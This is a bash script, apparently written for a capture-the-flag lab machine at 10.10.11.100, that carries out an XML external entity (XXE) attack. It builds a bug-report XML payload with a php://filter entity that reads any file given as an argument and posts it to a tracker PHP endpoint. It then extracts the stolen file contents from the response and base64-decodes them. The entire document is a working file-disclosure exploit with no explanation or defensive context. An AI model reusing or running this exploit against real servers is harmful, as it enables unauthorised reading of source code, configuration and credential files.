#!/usr/bin/env bash

file=$1

xml="<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=$file\">
]>
<bugreport>
  <title>BEGINTAG &xxe; ENDTAG</title>
  <cwe></cwe>
  <cvss></cvss>
  <reward></reward>
</bugreport>
"

data=$(echo $xml | base64 | sed 's/\+/%2b/g')

res=$(curl -sd data=$data http://10.10.11.100/tracker_diRbPr00f314.php)

ok=$(echo "$res" | grep -E 'BEGINTAG|ENDTAG')

if [ -z "$ok" ]; then
  echo Nothing found
  exit 1
fi

begin=$(echo "$res" | grep -n BEGINTAG | awk -F : '{ print $1 }')
end=$(echo "$res" | grep -n ENDTAG | awk -F : '{ print $1 }')

echo "$res" | sed -n "${begin},${end}p" | sed -E 's/    <td>BEGINTAG | ENDTAG<\/td>//g' | base64 -d
